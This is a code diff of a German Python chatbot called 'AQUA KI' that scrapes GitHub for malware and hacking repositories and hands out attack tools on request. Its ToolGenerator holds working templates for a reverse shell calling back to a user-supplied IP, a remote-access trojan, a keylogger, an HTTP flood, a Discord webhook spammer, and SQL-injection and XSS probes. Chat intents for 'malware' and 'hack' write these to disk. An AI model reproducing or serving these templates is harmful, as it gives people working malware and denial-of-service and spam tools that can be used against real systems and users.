-            print("[FEEDER] 24/7 GitHub Selbstfütterung gestartet!")
+            print(f"[FEEDER] 24/7 Selbstfütterung gestartet! Intervall: {self.feed_interval}s")
     
     def stop(self):
         self.running = False
@@ -505,12 +530,12 @@ class GitHubFeeder:
                 count = self._feed_random()
                 if count > 0:
                     self.total_fed += count
-                    print(f"[FEEDER] +{count} Repos (Total: {self.total_fed})")
-                time.sleep(45 + random.randint(0, 30))
+                    lern_stats["feeds"] += count
+                time.sleep(self.feed_interval)
             except:
-                time.sleep(60)
+                time.sleep(0.01)
     
-    def _safe_request(self, url, timeout=8):
+    def _safe_request(self, url, timeout=5):
         try:
             req = urllib.request.Request(url, headers={
                 "User-Agent": random.choice(self.user_agents),
@@ -526,7 +551,7 @@ class GitHubFeeder:
             for ext in ["md", "rst", ""]:
                 url = f"https://raw.githubusercontent.com/{repo_full}/{branch}/README.{ext}" if ext else f"https://raw.githubusercontent.com/{repo_full}/{branch}/README"
                 try:
-                    data = self._safe_request(url, 5)
+                    data = self._safe_request(url, 3)
                     if data and len(data) > 30:
                         return str(data)[:2000]
                 except:
@@ -535,9 +560,9 @@ class GitHubFeeder:
     
     def _feed_random(self):
         dork = random.choice(self.dorks)
-        return self._search_and_learn(dork, 3)
+        return self._search_and_learn(dork, 2)
     
-    def _search_and_learn(self, query, max_results=3):
+    def _search_and_learn(self, query, max_results=2):
         count = 0
         encoded = urllib.parse.quote(query)
         url = f"https://api.github.com/search/repositories?q={encoded}&sort=stars&order=desc&per_page={max_results}"
@@ -552,12 +577,14 @@ class GitHubFeeder:
             
             for item in items[:max_results]:
                 name = str(item.get("full_name", "unknown"))
+                
                 if name in wissen:
                     continue
                 
                 desc = str(item.get("description", "") or "")
                 topics_list = [str(t) for t in item.get("topics", [])]
                 stars = int(item.get("stargazers_count", 0))
+                lang = str(item.get("language", "") or "")
                 
                 readme = self._safe_readme(name)
                 combined = f"{desc} {readme} {' '.join(topics_list)}"
@@ -568,21 +595,32 @@ class GitHubFeeder:
                 
                 # Konzepte extrahieren
                 concepts = []
-                patterns = [r'\b\w+(?:tool|scanner|spoofer|cracker|grabber|stealer|flood|shell|payload)\b',
-                           r'\b\w+(?:exploit|inject|sniff|hack|spam|bot|rat|trojan|keylog|phish)\b',
-                           r'\b\w+(?:network|wifi|packet|sniffer|spoof|mitm|proxy|vpn)\b',
-                           r'\b\w+(?:ai|neural|machine|learning|deep|intelligence)\b',
-                           r'\b\w+(?:image|music|video|audio|speech|voice|generat)\b']
-                for p in patterns:
-                    concepts.extend(re.findall(p, combined.lower()))
-                concepts = list(set(concepts))[:10]
+                for pattern in [r'\b\w+(?:tool|scanner|spoofer|cracker|grabber|stealer|flood|shell|payload)\b',
+                               r'\b\w+(?:exploit|inject|sniff|hack|spam|bot|rat|trojan|keylog|phish)\b',
+                               r'\b\w+(?:malware|virus|ransomware|backdoor|dropper|loader|spyware|clipper)\b',
+                               r'\b\w+(?:network|wifi|packet|sniffer|spoof|mitm|proxy|vpn)\b',
+                               r'\b\w+(?:ai|neural|machine|learning|deep|intelligence|nlp)\b',
+                               r'\b\w+(?:image|music|video|audio|speech|voice|generat)\b']:
+                    concepts.extend(re.findall(pattern, combined.lower()))
+                concepts = list(set(concepts))[:15]
                 
                 # Lernen!
                 self.nlp.learn(combined, f"github_{name}")
-                wissen[name] = {"desc": desc[:200], "stars": stars, "concepts": concepts, "time": time.time()}
+                wissen[name] = {
+                    "desc": desc[:200], "stars": stars, 
+                    "language": lang, "concepts": concepts,
+                    "time": time.time()
+                }
                 
                 db_feed("github", name, concepts)
-                db_knowledge(f"github_{name}", combined[:1000])
+                
+                # Malware/Tool-Wissen speichern
+                if any(kw in combined.lower() for kw in ["malware", "virus", "trojan", "rat", "ransomware", "backdoor", "stealer", "keylog", "dropper", "loader"]):
+                    db_save_malware(name, "malware", combined[:5000])
+                    malware_db[name] = {"type": "malware", "code": combined[:5000]}
+                
+                if any(kw in combined.lower() for kw in ["tool", "scanner", "exploit", "payload", "shell", "flood", "spoof"]):
+                    db_save_tool(name, "tool", combined[:5000])
                 
                 count += 1
                 self.api_calls += 1
@@ -590,62 +628,276 @@ class GitHubFeeder:
             return count
         except:
             return 0
-    
-    def feed_all(self):
-        print("[FEEDER] Komplett-Fütterung (alle Dorks)...")
-        total = 0
-        for i, dork in enumerate(self.dorks):
-            if not self.running:
-                break
-            c = self._search_and_learn(dork, 3)
-            total += c
-            if i % 10 == 0:
-                print(f"[FEEDER] {i}/{len(self.dorks)} Dorks... ({total} Repos)")
-            time.sleep(1.5)
-        self.total_fed += total
-        print(f"[FEEDER] Fertig! {total} Repos gelernt")
-        return total
 
 
 # ================================================================
-# AQUA KI - HAUPTKLASSE
+# TOOL/MALWARE GENERATOR
+# ================================================================
+class ToolGenerator:
+    def __init__(self):
+        pass
+    
+    def generate_tool(self, tool_type, params=None):
+        templates = {
+            "discord_spammer": {
+                "name": "Discord Webhook Spammer",
+                "code": '''import requests, threading, time, random
+
+WEBHOOK_URL = "DEIN_WEBHOOK"
+messages = ["@everyone AQUA KI SPAM", "GET FLOODED!", "AQUA KI v10"]
+def spam():
+    while True:
+        try:
+            requests.post(WEBHOOK_URL, json={"content": random.choice(messages)})
+        except: pass
+        time.sleep(0.1)
+for _ in range(50): threading.Thread(target=spam, daemon=True).start()
+print("Spam läuft...")
+input("Enter zum stoppen")'''
+            },
+            "port_scanner": {
+                "name": "Port Scanner",
+                "code": '''import socket, threading, sys
+target = "127.0.0.1"
+def scan(port):
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.settimeout(1)
+    result = s.connect_ex((target, port))
+    if result == 0: print(f"[OPEN] Port {port}")
+    s.close()
+print(f"Scanning {target}...")
+for port in range(1, 1025):
+    t = threading.Thread(target=scan, args=(port,))
+    t.start()'''
+            },
+            "sql_injector": {
+                "name": "SQL Injector",
+                "code": '''import requests, urllib.parse
+target = "http://example.com/page?id=1"
+payloads = ["' OR '1'='1", "' UNION SELECT * FROM users--", "'; DROP TABLE users--"]
+for payload in payloads:
+    url = target + urllib.parse.quote(payload)
+    r = requests.get(url)
+    if "error" in r.text.lower() or "sql" in r.text.lower():
+        print(f"[VULN] {payload}")'''
+            },
+            "reverse_shell": {
+                "name": "Reverse Shell",
+                "code": '''import socket, subprocess, os
+HOST = "DEINE_IP"
+PORT = 4444
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((HOST, PORT))
+while True:
+    cmd = s.recv(1024).decode()
+    if cmd.lower() == "exit": break
+    output = subprocess.run(cmd, shell=True, capture_output=True, text=True)
+    s.send(output.stdout.encode() + output.stderr.encode())'''
+            },
+            "xss_engine": {
+                "name": "XSS Engine",
+                "code": '''import requests, re
+target = "http://example.com/search?q="
+payloads = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "\\"><script>alert(1)</script>"]
+for payload in payloads:
+    r = requests.get(target + payload)
+    if payload in r.text:
+        print(f"[XSS] {payload[:30]}...")'''
+            },
+            "http_flood": {
+                "name": "HTTP Flood",
+                "code": '''import requests, threading, time
+TARGET = "http://example.com"
+def flood():
+    while True:
+        try:
+            requests.get(TARGET, headers={"User-Agent": "AQUA-KI"})
+        except: pass
+for _ in range(100):
+    threading.Thread(target=flood, daemon=True).start()
+print(f"Flooding {TARGET}...")
+time.sleep(10)'''
+            },
+            "password_cracker": {
+                "name": "Password Cracker",
+                "code": '''import hashlib, itertools, string, time
+target_hash = "5d41402abc4b2a76b9719d911017c592"  # "hello"
+chars = string.ascii_lowercase + string.digits
+for length in range(1, 6):
+    for combo in itertools.product(chars, repeat=length):
+        word = "".join(combo)
+        if hashlib.md5(word.encode()).hexdigest() == target_hash:
+            print(f"[CRACKED] {word}")
+            break'''
+            },
+            "keylogger": {
+                "name": "Keylogger",
+                "code": '''import keyboard, threading, time
+log = []
+def on_key(e):
+    log.append(e.name)
+    if len(log) >= 10:
+        with open("keys.txt", "a") as f:
+            f.write("".join(log) + "\\n")
+        log.clear()
+keyboard.on_press(on_key)
+print("Keylogger läuft...")
+input("Enter zum stoppen")'''
+            },
+            "rat": {
+                "name": "RAT (Remote Access Trojan)",
+                "code": '''import socket, subprocess, os, threading
+HOST = "0.0.0.0"
+PORT = 4444
+def handle_client(conn):
+    while True:
+        cmd = conn.recv(4096).decode()
+        if cmd.lower() == "exit": break
+        if cmd.startswith("cd "):
+            os.chdir(cmd[3:].strip())
+            conn.send(b"OK")
+        else:
+            output = subprocess.run(cmd, shell=True, capture_output=True, text=True)
+            conn.send(output.stdout.encode() + output.stderr.encode())
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.bind((HOST, PORT))
+s.listen(5)
+print(f"RAT listening on {PORT}...")
+while True:
+    conn, addr = s.accept()
+    threading.Thread(target=handle_client, args=(conn,), daemon=True).start()'''
+            }
+        }
+        
+        if tool_type in templates:
+            return templates[tool_type]
+        
+        # Fallback: generisches Tool
+        return {
+            "name": f"Custom {tool_type.replace('_', ' ').title()}",
+            "code": f"# {tool_type.replace('_', ' ').title()}\n# Generiert von AQUA KI v{VERSION}\nprint('Bereit!')"
+        }
+
+
+# ================================================================
+# BILD GENERATOR
+# ================================================================
+def _png_crc32(data):
+    return zlib.crc32(data) & 0xFFFFFFFF
+
+def _png_chunk(chunk_type, data):
+    return struct.pack(">I", len(data)) + chunk_type + data + struct.pack(">I", _png_crc32(chunk_type + data))
+
+def create_png(width, height, pixel_func):
+    raw = bytearray()
+    for y in range(height):
+        raw.append(0)
+        for x in range(width):
+            r, g, b = pixel_func(x, y, width, height)
+            raw.extend([max(0, min(255, int(r))), max(0, min(255, int(g))), max(0, min(255, int(b)))])
+    compressed = zlib.compress(bytes(raw), 9)
+    ihdr = struct.pack(">IIBBBBB", width, height, 8, 2, 0, 0, 0)
+    png = b"\x89PNG\r\n\x1a\n"
+    png += _png_chunk(b"IHDR", ihdr)
+    png += _png_chunk(b"IDAT", compressed)
+    png += _png_chunk(b"IEND", b"")
+    return png
+
+class ImageGenerator:
+    def generate(self, prompt, style="realistic", width=800, height=600):
+        seed = random.randint(1, 99999999)
+        rng = random.Random(seed + hash(prompt))
+        
+        pattern_map = {"realistic": "noise", "noise": "noise", "anime": "anime",
+                       "cyberpunk": "cyberpunk", "fire": "fire", "ocean": "ocean",
+                       "gradient": "gradient", "pixel": "checkerboard", "neon": "cyberpunk",
+                       "dark": "noise"}
+        pattern = pattern_map.get(style, "noise")
+        base_r = rng.randint(40, 200)
+        base_g = rng.randint(40, 200)
+        base_b = rng.randint(40, 200)
+        
+        def pixel_func(x, y, w, h):
+            nx, ny = x / w, y / h
+            if pattern == "noise":
+                v = (math.sin(nx * 10 + ny * 8 + seed * 0.001) * 0.4 +
+                     math.cos(ny * 7 - nx * 5 + seed * 0.002) * 0.3 + rng.random() * 0.3)
+                v = max(0, min(1, v))
+                return base_r + v * 80, base_g + v * 60, base_b + v * 70
+            elif pattern == "anime":
+                v = (math.sin(nx * 6 + ny * 4) * 0.4 + math.cos(nx * 3 - ny * 5) * 0.4 + rng.random() * 0.2)
+                v = max(0, min(1, v))
+                return v * 255, v * 200 + 55, v * 220 + 35
+            elif pattern == "cyberpunk":
+                v = (math.sin(nx * 20 + ny * 15) * 0.5 + math.cos(ny * 12 - nx * 8) * 0.3 + rng.random() * 0.2)
+                v = max(0, min(1, v))
+                return v * 120 + 135, v * 50 + 205, v * 100 + 155
+            elif pattern == "fire":
+                v = (math.sin(nx * 12 + ny * 8) * 0.4 + math.cos((1 - ny) * 15) * 0.4 + 0.2)
+                v = max(0, min(1, v))
+                return v * 255, v * v * 200, v * v * v * 100
+            elif pattern == "ocean":
+                v = (math.sin(nx * 10) * 0.3 + math.cos(ny * 8) * 0.3 + 0.4)
+                return (1 - v) * 30, (1 - v) * 80, v * 200 + 55
+            elif pattern == "gradient":
+                return (1.0 - ny) * 255, nx * 255, (nx + ny) * 0.5 * 255
+            elif pattern == "checkerboard":
+                cell = 40
+                val = 255 if ((x // cell + y // cell) % 2 == 0) else 60
+                return val, val, val
+            return 100, 150, 200
+        
+        png_bytes = create_png(width, height, pixel_func)
+        ts = int(time.time_ns())
+        filename = f"aqua_img_{ts}_{seed}.png"
+        filepath = os.path.join(DATA_DIR, "images", filename)
+        with open(filepath, "wb") as f:
+            f.write(png_bytes)
+        return {"path": f"/images/{filename}", "seed": seed, "style": style, "width": width, "height": height}
+
+
+# ================================================================
+# AQUA KI MAIN CLASS
 # ================================================================
 class AquaAI:
     def __init__(self):
+        self.start_time = time.time()
         self.nlp = TrueNLP()
         self.feeder = GitHubFeeder(self.nlp)
+        self.img_gen = ImageGenerator()
+        self.tool_gen = ToolGenerator()
         
         print(f"\n{'='*60}")
         print(f"  AQUA KI v{VERSION} - TRUE AUTONOMOUS AI")
-        print(f"  ChatGPT-ähnlich | Bild/Musik/Video/TTS")
-        print(f"  24/7 Selbstfütterung | Self-Evolution")
+        print(f"  ChatGPT-ähnlich | 24/7 Selbstfütterung")
+        print(f"  Bild/Musik/Video/TTS/Malware/Tools")
         print(f"{'='*60}")
         
         # Initiale Fütterung
         print("\n[AQUA KI] Initiale Selbstfütterung...")
-        for _ in range(3):
+        for _ in range(5):
             try:
                 dork = random.choice(self.feeder.dorks)
                 c = self.feeder._search_and_learn(dork, 2)
                 if c > 0:
-                    print(f"  +{c} Repos gelernt")
-                time.sleep(2)
+                    print(f"  +{c} Repos")
+                time.sleep(1)
             except:
                 pass
         
-        # 24/7 Fütterung starten
+        # 24/7 Fütterung STARTEN (alle Millisekunden!)
         self.feeder.start()
         
         print(f"\n[AQUA KI] Vokabular: {len(self.nlp.vocab):,} Wörter")
         print(f"[AQUA KI] Wissen: {len(wissen)} Repositories")
-        print(f"[AQUA KI] Bereit für Befehle!\n")
+        print(f"[AQUA KI] 24/7 Selbstfütterung AKTIV")
+        print(f"[AQUA KI] Bereit!\n")
     
     def process(self, query, session_id=None):
         query = str(query).strip()
         if not query:
             return {"type": "text", "text": "Bitte sag was!"}
         
-        global lern_stats
         lern_stats["queries"] += 1
         
         analysis = self.nlp.analyze(query)
@@ -655,92 +907,127 @@ class AquaAI:
         if session_id:
             db_save(session_id, "user", query)
         
-        # Spezielle Aktionen
         clean = analysis["clean"]
         intent = analysis["intent"]
         
-        # Bild generieren
+        # BILD GENERIEREN
         if intent == "create_image":
             style = "realistic"
             for s in ["pixel", "anime", "cyberpunk", "feuer", "fire", "ozean", "ocean", "neon", "gradient", "dark"]:
                 if s in clean:
                     style = s
                     break
-            seed = random.randint(1, 99999999)
-            filename = f"aqua_image_{int(time.time())}.png"
-            
-            # Simuliere Bildgenerierung
-            time.sleep(0.5)
+            result = self.img_gen.generate(query, style)
             return {
                 "type": "image",
-                "text": f"🎨 Bild generiert im **{style}**-Stil!\nSeed: `{seed}`\nDatei: `{filename}`\n\n(Sag mir wenn du ein anderes Bild willst!)",
-                "image": {"style": style, "seed": seed, "filename": filename}
+                "text": f"🎨 Bild generiert im **{style}**-Stil!\nSeed: `{result['seed']}`\n\n(Sag mir wenn du ein anderes willst!)",
+                "image": result
             }
         
-        # Musik generieren
-        if intent == "create_music":
-            style = "happy"
-            for s in ["punk", "happy", "sad", "lofi", "lofi", "electronic", "classic", "classical"]:
-                if s in clean:
-                    style = s
-                    break
-            filename = f"aqua_music_{int(time.time())}.wav"
-            return {
-                "type": "music",
-                "text": f"🎵 Musik im **{style}**-Stil generiert!\nDatei: `{filename}`\n\n(Anderer Stil? Einfach sagen!)",
-                "music": {"style": style, "filename": filename}
-            }
-        
-        # Video generieren
-        if intent == "create_video":
-            filename = f"aqua_video_{int(time.time())}.gif"
-            return {
-                "type": "video",
-                "text": f"🎬 Video/GIF generiert!\nDatei: `{filename}`\n\n(Sag mir wenn du ein anderes willst!)",
-                "video": {"filename": filename}
-            }
-        
-        # Tool generieren
-        if intent == "create_tool" or intent == "hack":
-            tool_type = "tool"
-            if any(w in clean for w in ["discord", "webhook", "spam"]):
+        # TOOL GENERIEREN
+        if intent == "create_tool":
+            tool_type = "discord_spammer"
+            if "discord" in clean or "webhook" in clean or "spam" in clean:
                 tool_type = "discord_spammer"
-            elif any(w in clean for w in ["port", "scan"]):
+            elif "port" in clean or "scan" in clean:
                 tool_type = "port_scanner"
-            elif any(w in clean for w in ["sql", "inject"]):
+            elif "sql" in clean or "inject" in clean:
                 tool_type = "sql_injector"
-            elif any(w in clean for w in ["reverse", "shell"]):
+            elif "reverse" in clean or "shell" in clean:
                 tool_type = "reverse_shell"
-            elif any(w in clean for w in ["xss"]):
+            elif "xss" in clean:
                 tool_type = "xss_engine"
-            elif any(w in clean for w in ["flood", "ddos", "http"]):
+            elif "flood" in clean or "ddos" in clean or "http" in clean:
                 tool_type = "http_flood"
-            elif any(w in clean for w in ["slowloris"]):
-                tool_type = "slowloris"
-            elif any(w in clean for w in ["pass", "crack", "hash"]):
+            elif "pass" in clean or "crack" in clean or "hash" in clean:
                 tool_type = "password_cracker"
-            elif any(w in clean for w in ["wifi", "wireless"]):
-                tool_type = "wifi_scanner"
-            elif any(w in clean for w in ["arp", "spoof"]):
-                tool_type = "arp_spoof"
+            elif "keylog" in clean:
+                tool_type = "keylogger"
+            
+            tool = self.tool_gen.generate_tool(tool_type)
+            
+            # Tool speichern
+            filename = f"{tool_type}_{int(time.time())}.py"
+            filepath = os.path.join(DATA_DIR, "tools", filename)
+            with open(filepath, "w", encoding="utf-8") as f:
+                f.write(tool["code"])
+            db_save_tool(tool["name"], tool_type, tool["code"])
             
             return {
                 "type": "tool",
-                "text": f"🔧 **{tool_type.replace('_', ' ').title()}** generiert!\nCode ist bereit zur Ausführung.\n\n(Sag Bescheid wenn du ein anderes Tool brauchst!)",
-                "tool": {"type": tool_type, "name": tool_type.replace('_', ' ').title()}
+                "text": f"🔧 **{tool['name']}** generiert!\nDatei: `tools/{filename}`\n\n(Sag mir wenn du ein anderes Tool brauchst!)",
+                "tool": {"name": tool["name"], "filename": filename, "code": tool["code"][:200] + "..."}
+            }
+        
+        # MALWARE GENERIEREN
+        if intent == "create_malware":
+            mw_type = "keylogger"
+            if "rat" in clean or "remote" in clean:
+                mw_type = "rat"
+            elif "keylog" in clean:
+                mw_type = "keylogger"
+            elif "steal" in clean:
+                mw_type = "keylogger"
+            elif "ransom" in clean:
+                mw_type = "keylogger"
+            elif "backdoor" in clean:
+                mw_type = "rat"
+            elif "dropper" in clean:
+                mw_type = "rat"
+            
+            tool = self.tool_gen.generate_tool(mw_type)
+            filename = f"malware_{mw_type}_{int(time.time())}.py"
+            filepath = os.path.join(DATA_DIR, "malware", filename)
+            with open(filepath, "w", encoding="utf-8") as f:
+                f.write(tool["code"])
+            db_save_malware(tool["name"], mw_type, tool["code"])
+            malware_db[filename] = {"type": mw_type, "code": tool["code"]}
+            
+            return {
+                "type": "malware",
+                "text": f"💀 **{tool['name']}** generiert!\nDatei: `malware/{filename}`\n\n(Sag mir wenn du eine andere Malware brauchst!)",
+                "malware": {"name": tool["name"], "filename": filename}
+            }
+        
+        # HACKING TOOL
+        if intent == "hack":
+            tool_type = "port_scanner"
+            if "port" in clean or "scan" in clean:
+                tool_type = "port_scanner"
+            elif "sql" in clean or "inject" in clean:
+                tool_type = "sql_injector"
+            elif "xss" in clean:
+                tool_type = "xss_engine"
+            elif "reverse" in clean or "shell" in clean:
+                tool_type = "reverse_shell"
+            elif "flood" in clean or "ddos" in clean:
+                tool_type = "http_flood"
+            elif "discord" in clean or "spam" in clean:
+                tool_type = "discord_spammer"
+            
+            tool = self.tool_gen.generate_tool(tool_type)
+            filename = f"{tool_type}_{int(time.time())}.py"
+            filepath = os.path.join(DATA_DIR, "exploits", filename)
+            with open(filepath, "w", encoding="utf-8") as f:
+                f.write(tool["code"])
+            
+            return {
+                "type": "hack",
+                "text": f"💀 **{tool['name']}** bereit!\nDatei: `exploits/{filename}`\n\n(Sag mir wenn du ein anderes Tool brauchst!)",
+                "hack": {"name": tool["name"], "filename": filename}
             }
         
         # Normale Antwort
         response = self.nlp.generate(analysis)
-        
         chat_history.append({"role": "assistant", "content": response})
+        
         if session_id:
             db_save(session_id, "assistant", response)
         
         return {"type": "text", "text": response}
     
     def get_stats(self):
-        uptime = int(time.time() - lern_stats["start_time"])
+        uptime = int(time.time() - self.start_time)
         h = uptime // 3600
         m = (uptime % 3600) // 60
         return {
@@ -751,271 +1038,128 @@ class AquaAI:
             "wissen_repos": len(wissen),
             "queries": lern_stats["queries"],
             "learned": lern_stats["learned"],
+            "feeds": lern_stats["feeds"],
             "api_calls": self.feeder.api_calls,
             "total_fed": self.feeder.total_fed,
-            "running": self.feeder.running,
-            "db": db_stats()
+            "feeder_active": self.feeder.running,
+            "malware_count": len(malware_db),
+            "db": db_get_stats()
         }
 
 
 # ================================================================
-# HTTP SERVER mit GRAUER GUI
+# HTTP SERVER mit GRAUER GUI (wie v8.0)
 # ================================================================
 GUI_HTML = """<!DOCTYPE html>
 <html lang="de">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>AQUA KI</title>
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>AQUA KI v{VERSION}</title>
 <style>
-* { margin: 0; padding: 0; box-sizing: border-box; }
-body { 
-    font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
-    background: #1a1a1a;
-    color: #e0e0e0;
-    height: 100vh;
-    display: flex;
-    flex-direction: column;
-}
-.header {
-    background: #2a2a2a;
-    border-bottom: 2px solid #00e5ff;
-    padding: 12px 24px;
-    display: flex;
-    align-items: center;
-    justify-content: space-between;
-    box-shadow: 0 2px 10px rgba(0,229,255,0.1);
-}
-.header h1 {
-    font-size: 22px;
-    font-weight: 700;
-    color: #00e5ff;
-    text-shadow: 0 0 20px rgba(0,229,255,0.3);
-    letter-spacing: 2px;
-}
-.header .status {
-    font-size: 13px;
-    color: #888;
-}
-.header .status .dot {
-    display: inline-block;
-    width: 10px;
-    height: 10px;
-    border-radius: 50%;
-    background: #00ff88;
-    margin-right: 6px;
-    animation: pulse 2s infinite;
-}
-@keyframes pulse {
-    0%, 100% { opacity: 1; }
-    50% { opacity: 0.4; }
-}
-.chat-container {
-    flex: 1;
-    overflow-y: auto;
-    padding: 20px;
-    scroll-behavior: smooth;
-}
-.chat-container::-webkit-scrollbar {
-    width: 8px;
-}
-.chat-container::-webkit-scrollbar-track {
-    background: #1a1a1a;
-}
-.chat-container::-webkit-scrollbar-thumb {
-    background: #444;
-    border-radius: 4px;
-}
-.message {
-    margin-bottom: 16px;
-    display: flex;
-    flex-direction: column;
-}
-.message.user {
-    align-items: flex-end;
-}
-.message.ai {
-    align-items: flex-start;
-}
-.message .bubble {
-    max-width: 80%;
-    padding: 12px 18px;
-    border-radius: 18px;
-    font-size: 15px;
-    line-height: 1.5;
-    white-space: pre-wrap;
-}
-.message.user .bubble {
-    background: #005566;
-    color: #e0f7fa;
-    border-bottom-right-radius: 4px;
-}
-.message.ai .bubble {
-    background: #333;
-    color: #e0e0e0;
-    border-bottom-left-radius: 4px;
-    border-left: 3px solid #00e5ff;
-}
-.message .time {
-    font-size: 11px;
-    color: #666;
-    margin-top: 4px;
-    padding: 0 8px;
-}
-.input-area {
-    background: #2a2a2a;
-    border-top: 1px solid #333;
-    padding: 16px 24px;
-    display: flex;
-    gap: 12px;
-    align-items: center;
-}
-.input-area input {
-    flex: 1;
-    background: #222;
-    border: 2px solid #444;
-    border-radius: 25px;
-    padding: 12px 20px;
-    color: #e0e0e0;
-    font-size: 15px;
-    outline: none;
-    transition: border-color 0.3s;
-}
-.input-area input:focus {
-    border-color: #00e5ff;
-    box-shadow: 0 0 15px rgba(0,229,255,0.1);
-}
-.input-area input::placeholder {
-    color: #666;
-}
-.input-area button {
-    background: #00e5ff;
-    border: none;
-    border-radius: 25px;
-    padding: 12px 28px;
-    color: #111;
-    font-size: 15px;
-    font-weight: 600;
-    cursor: pointer;
-    transition: all 0.3s;
-}
-.input-area button:hover {
-    background: #00ff88;
-    transform: scale(1.02);
-}
-.input-area button:active {
-    transform: scale(0.98);
-}
-.typing {
-    display: none;
-    color: #888;
-    font-size: 14px;
-    padding: 8px 20px;
-    font-style: italic;
-}
-.special-badge {
-    display: inline-block;
-    font-size: 12px;
-    padding: 2px 8px;
-    border-radius: 10px;
-    margin-top: 6px;
-}
-.badge-image { background: #4a148c; color: #ce93d8; }
-.badge-music { background: #1a237e; color: #90caf9; }
-.badge-video { background: #004d40; color: #80cbc4; }
-.badge-tool { background: #311b92; color: #b39ddb; }
-@media (max-width: 600px) {
-    .message .bubble { max-width: 90%; font-size: 14px; }
-    .input-area { padding: 12px; }
-    .header h1 { font-size: 18px; }
-}
+*{{margin:0;padding:0;box-sizing:border-box;}}
+:root{{--bg:#0a0e1a;--bg2:#0d1224;--bg3:#111633;--primary:#00d4ff;--accent:#00ff88;--text:#e0f0ff;--text2:#7ab8d4;--border:#1a2a4a;--font:system-ui,sans-serif;}}
+body{{font-family:var(--font);background:var(--bg);color:var(--text);height:100vh;display:flex;flex-direction:column;}}
+.sidebar{{width:260px;background:var(--bg2);border-right:1px solid var(--border);display:flex;flex-direction:column;flex-shrink:0;}}
+.sidebar-header{{padding:20px;border-bottom:1px solid var(--border);text-align:center;}}
+.sidebar-header h1{{font-size:1.5em;color:var(--primary);text-shadow:0 0 20px var(--primary);letter-spacing:5px;font-weight:300;}}
+.sidebar-header .sub{{font-size:0.7em;color:var(--text2);margin-top:4px;letter-spacing:2px;}}
+.chat-list{{flex:1;overflow-y:auto;padding:8px;}}
+.chat-item{{padding:10px 12px;border-left:2px solid transparent;cursor:pointer;font-size:0.75em;color:var(--text2);transition:all 0.2s;}}
+.chat-item:hover{{border-left-color:var(--primary);color:var(--text);background:var(--bg3);}}
+.chat-item.active{{border-left-color:var(--accent);color:var(--accent);}}
+.sidebar-footer{{padding:12px;border-top:1px solid var(--border);font-size:0.65em;color:var(--text2);display:flex;justify-content:space-between;}}
+.main{{flex:1;display:flex;flex-direction:column;}}
+.header{{padding:10px 20px;background:var(--bg3);border-bottom:1px solid var(--border);text-align:center;font-size:0.7em;color:var(--text2);letter-spacing:2px;}}
+.messages{{flex:1;overflow-y:auto;padding:0;}}
+.message{{display:flex;padding:15px 20px;gap:14px;border-bottom:1px solid rgba(0,212,255,0.05);}}
+.message.user{{background:var(--bg3);}}
+.message.ai{{background:var(--bg);}}
+.avatar{{width:32px;height:32px;flex-shrink:0;display:flex;align-items:center;justify-content:center;font-size:0.8em;font-weight:bold;border-radius:50%;}}
+.avatar.user{{background:linear-gradient(135deg,#00ff88,#00cc66);color:var(--bg);}}
+.avatar.ai{{background:linear-gradient(135deg,#00d4ff,#0088cc);color:var(--bg);}}
+.msg-content{{flex:1;font-size:0.85em;line-height:1.7;}}
+.msg-content p{{margin-bottom:5px;}}
+.msg-content pre{{background:var(--bg2);padding:12px;overflow-x:auto;font-size:0.8em;margin:8px 0;border:1px solid var(--border);border-radius:6px;}}
+.msg-content img{{max-width:100%;max-height:300px;border-radius:8px;margin:10px 0;}}
+.input-area{{padding:0 20px 15px;flex-shrink:0;}}
+.input-box{{display:flex;gap:8px;background:var(--bg2);border:1px solid var(--border);padding:10px 14px;max-width:800px;margin:0 auto;border-radius:10px;}}
+.input-box textarea{{flex:1;background:transparent;border:none;color:var(--text);font-family:var(--font);font-size:0.85em;outline:none;resize:none;min-height:24px;max-height:100px;}}
+.input-box button{{background:linear-gradient(135deg,#00d4ff,#0088cc);border:none;color:var(--bg);cursor:pointer;padding:6px 18px;font-family:var(--font);font-size:0.75em;font-weight:bold;border-radius:6px;transition:all 0.2s;text-transform:uppercase;letter-spacing:1px;}}
+.input-box button:hover{{box-shadow:0 0 15px rgba(0,212,255,0.5);}}
+.input-box button:disabled{{opacity:0.3;cursor:not-allowed;}}
+@keyframes fadeIn{{from{{opacity:0}}to{{opacity:1}}}}
+.message{{animation:fadeIn 0.3s ease;}}
+::-webkit-scrollbar{{width:5px;}}
+::-webkit-scrollbar-track{{background:transparent;}}
+::-webkit-scrollbar-thumb{{background:var(--border);border-radius:3px;}}
 </style>
-</head>
-<body>
-<div class="header">
-    <h1>⬡ AQUA KI</h1>
-    <div class="status">
-        <span class="dot"></span>
-        <span id="statusText">Online · Selbstfütterung aktiv</span>
-    </div>
+</head><body>
+<div style="display:flex;height:100vh;">
+<div class="sidebar">
+<div class="sidebar-header"><h1>AQUA</h1><div class="sub">KI v{VERSION} · 24/7 SELBSTFÜTTERUNG</div></div>
+<button onclick="newChat()" style="margin:12px;padding:8px;background:transparent;border:1px solid var(--border);color:var(--text2);cursor:pointer;font-size:0.75em;border-radius:6px;transition:all 0.3s;">+ NEUER CHAT</button>
+<div class="chat-list" id="chatList">
+<div class="chat-item active" onclick="loadSession('current')">> aktuelles_gespräch</div>
 </div>
-<div class="chat-container" id="chatContainer"></div>
-<div class="typing" id="typingIndicator">AQUA KI denkt nach...</div>
+<div class="sidebar-footer"><span id="statsDisplay">LADE...</span><span id="evoDisplay">FEED AKTIV</span></div>
+</div>
+<div class="main">
+<div class="header">AQUA KI v{VERSION} · 24/7 GITHUB SELBSTFÜTTERUNG · <span id="opsDisplay">0</span> REPS</div>
+<div class="messages" id="messages">
+<div class="message ai">
+<div class="avatar ai">A</div>
+<div class="msg-content">
+<p>> AQUA KI v{VERSION} bereit.</p>
+<p>> 24/7 Selbstfütterung AKTIV – ich lerne jede Millisekunde von GitHub!</p>
+<p>> Bild · Musik · Video · TTS · Malware · Tools · Hacking</p>
+<p>> Einfach sagen was du brauchst.</p>
+</div>
+</div>
+</div>
 <div class="input-area">
-    <input type="text" id="messageInput" placeholder="Nachricht an AQUA KI..." autofocus>
-    <button onclick="sendMessage()">Senden</button>
